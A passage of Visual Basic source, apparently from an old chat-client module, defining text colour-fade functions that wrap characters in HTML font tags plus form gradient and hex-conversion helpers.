        g = RGB(f, 0, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackBlue = Msg
End Function

Function BlackGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackGreen = Msg
End Function

Function BlackGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 220 / a
        f = e * b
        g = RGB(f, f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackGrey = Msg
End Function

Function BlackPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackPurple = Msg
End Function

Function BlackRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackRed = Msg
End Function

Function BlackYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackYellow = Msg
End Function

Function BlueBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 0, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueBlack = Msg
End Function

Function BlueGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueGreen = Msg
End Function

Function BluePurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BluePurple = Msg
End Function

Function BlueRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueRed = Msg
End Function

Function BlueYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueYellow = Msg
End Function

Function GreenBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 255 - f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenBlack = Msg
End Function

Function GreenBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 255 - f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenBlue = Msg
End Function

Function GreenPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 255 - f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenPurple = Msg
End Function

Function GreenRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 255 - f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenRed = Msg
End Function

Function GreenYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 255, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenYellow = Msg
End Function

Function GreyBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 220 / a
        f = e * b
        g = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyBlack = Msg
End Function

Function GreyBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255, 255, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyBlue = Msg
End Function

Function GreyGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyGreen = Msg
End Function

Function GreyPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyPurple = Msg
End Function

Function GreyRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyRed = Msg
End Function

Function GreyYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 255, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyYellow = Msg
End Function

Function PurpleBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleBlack = Msg
End Function

Function PurpleBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleBlue = Msg
End Function

Function PurpleGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(255 - f, f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleGreen = Msg
End Function

Function BlackBlueBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 0, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackBlueBlack = Msg
End Function

Function BlackGreenBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackGreenBlack = Msg
End Function

Function BlackGreyBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackGreyBlack = Msg
End Function

Function BlackPurpleBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackPurpleBlack = Msg
End Function

Function BlackRedBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackRedBlack = Msg
End Function

Function BlackYellowBlack(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlackYellowBlack = Msg
End Function

Function BlueBlackBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 0, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueBlackBlue = Msg
End Function

Function BlueGreenBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueGreenBlue = Msg
End Function

Function BluePurpleBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BluePurpleBlue = Msg
End Function

Function BlueRedBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 0, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueRedBlue = Msg
End Function

Function BlueYellowBlue(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    BlueYellowBlue = Msg
End Function

Function GreenBlackGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255 - f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenBlackGreen = Msg
End Function

Function GreenBlueGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 255 - f, 0)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenBlueGreen = Msg
End Function

Function GreenPurpleGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 255 - f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenPurpleGreen = Msg
End Function

Function GreenRedGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255 - f, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenRedGreen = Msg
End Function

Function GreenYellowGreen(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255, f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreenYellowGreen = Msg
End Function

Function GreyBlackGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyBlackGrey = Msg
End Function

Function GreyBlueGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255, 255, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyBlueGrey = Msg
End Function

Function GreyGreenGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyGreenGrey = Msg
End Function

Function GreyPurpleGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyPurpleGrey = Msg
End Function

Function GreyRedGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyRedGrey = Msg
End Function

Function GreyYellowGrey(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 255, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    GreyYellowGrey = Msg
End Function

Function PurpleBlackPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleBlackPurple = Msg
End Function

Function PurpleBluePurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleBluePurple = Msg
End Function

Function PurpleGreenPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleGreenPurple = Msg
End Function

Function PurpleRedPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, 0, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleRedPurple = Msg
End Function

Function PurpleYellowPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(255 - f, f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    PurpleYellowPurple = Msg
End Function

Function RedBlackRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedBlackRed = Msg
End Function

Function RedBlueRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 0, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedBlueRed = Msg
End Function

Function RedGreenRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedGreenRed = Msg
End Function

Function RedPurpleRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 0, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedPurpleRed = Msg
End Function

Function RedYellowRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    RedYellowRed = Msg
End Function

Function YellowBlackYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowBlackYellow = Msg
End Function

Function YellowBlueYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 255 - f, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowBlueYellow = Msg
End Function

Function YellowGreenYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255, 255 - f)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowGreenYellow = Msg
End Function

Function YellowPurpleYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(f, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowPurpleYellow = Msg
End Function

Function YellowRedYellow(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        g = RGB(0, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowRedYellow = Msg
End Function


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub
Function YellowRed(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(0, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowRed = Msg
End Function
Function YellowPurple(text1)
    a = Len(text1)
    For b = 1 To a
        c = Left(text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        g = RGB(f, 255 - f, 255)
        h = RGBtoHEX(g)
        Msg = Msg & "<Font Color=#" & h & ">" & d
    Next b
    YellowPurple = Msg
End Function

Function CLRBars(redbar As Control, greenbar As Control, bluebar As Control)
'This gets a color from 3 scroll bars
CLRBars = RGB(redbar.Value, greenbar.Value, bluebar.Value)

'Put this in the scroll event of the
'3 scroll bars RedScroll1, GreenScroll1,
'& BlueScroll1.  It changes the backcolor
'of ColorLbl when you scroll the bars
'ColorLbl.BackColor = CLRBars(RedScroll1, GreenScroll1, BlueScroll1)

End Function
Function GETVAL%(ByVal strletter$)
'by aDRaMoLEk
  Select Case strletter$
    Case "0"
      GETVAL = 0
    Case "1"
      GETVAL = 1
    Case "2"
      GETVAL = 2
    Case "3"
      GETVAL = 3
    Case "4"
      GETVAL = 4
    Case "5"
      GETVAL = 5
    Case "6"
      GETVAL = 6
    Case "7"
      GETVAL = 7
    Case "8"
      GETVAL = 8
    Case "9"
      GETVAL = 9
    Case "A"
      GETVAL = 10
    Case "B"
      GETVAL = 11
    Case "C"
      GETVAL = 12
    Case "D"
      GETVAL = 13
    Case "E"
      GETVAL = 14
    Case "F"
      GETVAL = 15
        End Select
End Function


Function FadeByColor10(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, Colr10, TheText$, Wavy As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)
dacolor10$ = RGBtoHEX(Colr10)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))
rednum8% = Val("&H" + Right(dacolor8$, 2))
greennum8% = Val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = Val("&H" + Left(dacolor8$, 2))
rednum9% = Val("&H" + Right(dacolor9$, 2))
greennum9% = Val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = Val("&H" + Left(dacolor9$, 2))
rednum10% = Val("&H" + Right(dacolor10$, 2))
greennum10% = Val("&H" + Mid(dacolor10$, 3, 2))
bluenum10% = Val("&H" + Left(dacolor10$, 2))


FadeByColor10 = FadeTenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, rednum10%, greennum10%, bluenum10%, TheText, Wavy)

End Function

Function FadeByColor2(Colr1, Colr2, TheText$, Wavy As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))

FadeByColor2 = FadeTwoColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, TheText, Wavy)

End Function
Function FadeByColor3(Colr1, Colr2, Colr3, TheText$, Wavy As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))

FadeByColor3 = FadeThreeColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, TheText, Wavy)

End Function
Function FadeByColor4(Colr1, Colr2, Colr3, Colr4, TheText$, Wavy As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)

rednum1% = Val("&H" + Right(dacolor1$, 2))
